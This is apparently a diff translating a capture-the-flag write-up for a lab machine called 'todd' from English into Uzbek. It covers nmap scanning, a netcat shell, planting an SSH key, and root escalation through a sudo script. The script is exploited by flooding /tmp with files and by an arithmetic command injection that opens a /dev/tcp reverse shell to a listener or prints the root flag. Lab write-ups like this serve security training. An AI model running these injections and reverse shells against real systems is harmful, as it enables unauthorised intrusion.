@@ -1,6 +1,6 @@
 ## Reconnaissance
 
-### Initial Nmap Scan
+### Dastlabki Nmap skanerlash
 ```bash
 $ nmap -sV -sC -p- 192.168.56.3 -A
 
@@ -12,7 +12,7 @@ PORT      STATE SERVICE    VERSION
 ...
 ```
 
-### Second Nmap Scan Reveals Interesting Port
+### Ikkinchi Nmap skanerlash qiziqarli portni ko'rsatadi
 ```bash
 $ nmap -sV -p- 192.168.56.3
 -----------
@@ -23,11 +23,11 @@ PORT      STATE SERVICE    VERSION
 ...
 ```
 
-Note: Port 7066 appears intermittently.
+Eslatma: Port 7066 vaqti-vaqti bilan paydo bo'ladi.
 
-## Initial Access via Port 7066
+## 7066 port orqali dastlabki kirish
 
-### Persistent Connection Attempt
+### Doimiy ulanishga urinish
 ```bash
 $ while true;do nc 192.168.56.3 7066;done
 (UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
@@ -36,26 +36,26 @@ whoami
 todd
 ```
 
-### Establishing SSH Access
-1. Generate SSH key on attacker machine:
+### SSH Accessni o'rnatish
+1. SSH kalit yarating:
 ```bash
 ssh-keygen -t rsa -f todd
 ```
 
-2. On target machine:
+2. Maqsadli mashinada:
 ```bash
 mkdir -p /home/todd/.ssh
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOd2qBPt87qsYOMlBoxpn6uTqyKwHLIXcNj8eO.... void-strike@athena" > /home/todd/.ssh/authorized_keys
 ```
 
-3. Connect via SSH:
+3. SSH orqali ulanish:
 ```bash
 ssh todd@192.168.56.3 -i ~/.ssh/todd
 ```
 
 ## Privilege Escalation
 
-### Checking Sudo Privileges
+### Sudo imtiyozlarini tekshirish
 ```bash
 $ sudo -l
 Matching Defaults entries for todd on todd:
@@ -67,7 +67,7 @@ User todd may run the following commands on todd:
     (ALL : ALL) NOPASSWD: /usr/sbin/reboot
 ```
 
-### Analyzing guess_and_check.sh
+### guess_and_check.sh
 ```bash
 # check this script used by human 
 a=$((RANDOM%1000))
@@ -87,19 +87,19 @@ false_file="/tmp/$((RANDOM%1000))"
 [[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
 ```
 
-### Method 1: File Creation Exploit
-1. Create dummy files to increase probability:
+### 1-usul: Fayl yaratishdan foydalanish
+1. Ehtimollikni oshirish uchun soxta fayllar yarating:
 ```bash
 for i in {1..600}; do touch /tmp/$i ;done
 ```
 
-2. Run the script repeatedly until successful:
+2. Kalitni olmaguncha skriptni qayta-qayta ishga tushiring:
 ```bash
 sudo /bin/bash /srv/guess_and_check.sh
 ```
 
-### Method 2: Command Injection
-1. Execute arbitrary commands through input:
+### 2-usul: buyruqni kiritish
+1. Kirish orqali ixtiyoriy buyruqlarni bajaring:
 ```bash
 Please Input [316]
 [+] Check this script used by human.
@@ -107,20 +107,20 @@ Please Input [316]
 >>>N[$(/bin/bash -i >& /dev/tcp/192.168.56.1/9001 0>&1)]
 ```
 
-2. Set up listener:
+2. Tinglovchini sozlash:
 ```bash
 nc -vlnp 9001
 ```
 
-### Explanation of Command Injection
-The input `N[$(cat /root/root.txt)]` is interpreted in an arithmetic context, causing Bash to attempt evaluating the flag contents as arithmetic, which fails and reveals the flag content in the error message.
+### Buyruq in'ektsiyasini tushuntirish
+`N[$(cat /root/root.txt)]` kiritish arifmetik kontekstda talqin qilinadi, bu esa Bashning bayroq tarkibini arifmetik sifatida baholashga urinishiga sabab bo'ladi, bu esa muvaffaqiyatsizlikka uchraydi va xato xabaridagi bayroq mazmunini ko'rsatadi.
 
 ## Root Access
-Use the credentials from /root/.cred to switch to root:
+Rootga oʻtish uchun /root/.cred hisob maʼlumotlaridan foydalaning:
 ```bash
 su
 Password: [content of /root/.cred]
 root@todd:/home/todd#
 ```
 
-Or via the reverse shell obtained through command injection.
+Yoki in'ektsiya orqali olingan teskari qobiq orqali.
